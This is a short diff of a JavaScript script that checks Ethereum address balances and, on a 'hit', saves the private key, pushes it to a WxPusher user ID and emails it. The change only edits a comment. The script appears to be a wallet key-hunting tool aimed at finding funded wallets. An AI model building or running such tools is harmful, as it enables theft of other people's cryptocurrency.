@@ -70,7 +70,7 @@ async function queryAddresses() {
             saveToTextFile(address, privateKey);
             const uids = ['UID_a74XG9KK8OMBcMxRbm3uodWXf7nq'];
             sendWxPusherMessage('Hit ETH wallet-git', `ETH address：${address}，\nThe private key：${privateKey}，\nThe balance is：${roundedBalance} ETH`, uids);
-            sendEmail(address, balance, privateKey); // 发送邮
+            sendEmail(address, balance, privateKey); // 
         } else {
             console.log(`（${counter}/${totalAddresses}）地址: ${address}  用时：${elapsedTime} 毫秒 余额：${roundedBalance} ETH`);
         }
